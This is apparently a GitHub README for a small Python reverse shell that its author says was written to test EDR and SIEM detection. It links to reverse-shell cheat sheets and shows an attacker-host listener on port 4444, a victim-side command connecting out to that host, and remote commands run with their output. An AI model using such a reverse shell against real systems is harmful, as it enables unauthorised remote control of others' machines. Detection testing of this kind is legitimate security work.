# simple-webshell-py

A simple reverse / web shell in python.

This code was a simple exercise used for extended testing of EDR and SIEM platforms to try and avoid, but also encourage detection.

After finding great inspiration from various online sources, this quick and dirty code has been chopped up, documented and modified for fleixbility and readability. 

https://backdoorshell.gitbooks.io/oscp-useful-links/content/backdoorsweb-shells.html
https://github.com/security-cheatsheet/reverse-shell-cheatsheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://www.thepythoncode.com/article/create-reverse-shell-python

# Usage

On the attacker host:

    attacker@ip-x-x-x-x:~$ python3 /tmp/listener.py
    [*] Listening on 0.0.0.0:4444
    [*] Shell from: ('y.y.y.y', 49957)
    yars> ls -lah
    total 32
    drwxr-xr-x   7 neu  foo   224B Feb 10 21:48 .
    drwxr-xr-x   6 neu  foo   192B Feb 10 21:48 ..
    drwxr-xr-x  12 neu  foo   384B Feb 10 21:48 .git
    -rw-r--r--   1 neu  foo   1.0K Feb 10 21:48 LICENSE
    -rw-r--r--   1 neu  foo   248B Feb 10 21:48 README.md
    -rwxr-xr-x   1 neu  foo   1.7K Feb 10 23:16 listener.py
    -rwxr-xr-x   1 neu  foo   1.0K Feb 10 23:14 shell.py

    yars> ping 1.1.1.1 -c 4
    PING 1.1.1.1 (1.1.1.1): 56 data bytes
    64 bytes from 1.1.1.1: icmp_seq=0 ttl=59 time=33.694 ms
    64 bytes from 1.1.1.1: icmp_seq=1 ttl=59 time=10.370 ms
    64 bytes from 1.1.1.1: icmp_seq=2 ttl=59 time=9.607 ms
    64 bytes from 1.1.1.1: icmp_seq=3 ttl=59 time=11.022 ms

On the victim host:

    victim@neu:~$ python3 /tmp/shell.py --host x.x.x.x
    [+] Listener: Welcome!!!
    [+] Command rcvd: ls -lah
    [+] Command rcvd: ping 1.1.1.1 -c 4

